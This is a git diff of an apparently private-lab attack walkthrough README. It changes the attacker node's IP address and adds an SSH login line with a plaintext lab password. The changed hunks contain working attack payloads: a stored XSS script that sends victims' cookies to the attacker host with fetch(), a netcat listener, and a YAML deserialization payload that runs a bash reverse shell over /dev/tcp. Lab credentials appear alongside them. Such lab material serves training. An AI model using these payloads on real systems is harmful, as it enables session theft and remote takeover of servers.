@@ -9,7 +9,8 @@
 
 ## Prerequisites
 
-- Parrot attacker node running with static IP `10.0.40.10/24`
+- Parrot attacker node running with static IP `10.0.40.5/24`
+  - SSH: `sshpass -p L4b2 ssh lab2@10.0.40.5`
 - Server-A SYNAPSE Portal running: `http://192.168.30.10`
 - Server-B DataVault running: `http://192.168.30.20`
 
@@ -18,12 +19,12 @@
 ```bash
 nmcli con mod "Wired connection 1" \
   ipv4.method manual \
-  ipv4.addresses 10.0.40.10/24 \
+  ipv4.addresses 10.0.40.5/24 \
   ipv4.gateway 10.0.40.1 \
   ipv4.dns 10.0.40.1 \
   ipv4.ignore-auto-dns yes
 nmcli con up "Wired connection 1"
-ip a  # verify 10.0.40.10/24
+ip a  # verify 10.0.40.5/24
 ```
 
 ---
@@ -46,7 +47,7 @@ Login at `http://192.168.30.10/login` with `guest / guest123`.
 Navigate to `/comments` and submit:
 
 ```html
-<script>fetch('http://10.0.40.10:8000/?c='+encodeURIComponent(document.cookie))</script>
+<script>fetch('http://10.0.40.5:8000/?c='+encodeURIComponent(document.cookie))</script>
 ```
 
 **Step 1.3 — Wait for victim cookie:**
@@ -144,7 +145,7 @@ nc -lvnp 4444
 ```bash
 cat > exploit.yml << 'EOF'
 !!python/object/apply:os.system
-- "bash -c 'bash -i >& /dev/tcp/10.0.40.10/4444 0>&1'"
+- "bash -c 'bash -i >& /dev/tcp/10.0.40.5/4444 0>&1'"
 EOF
 ```
 
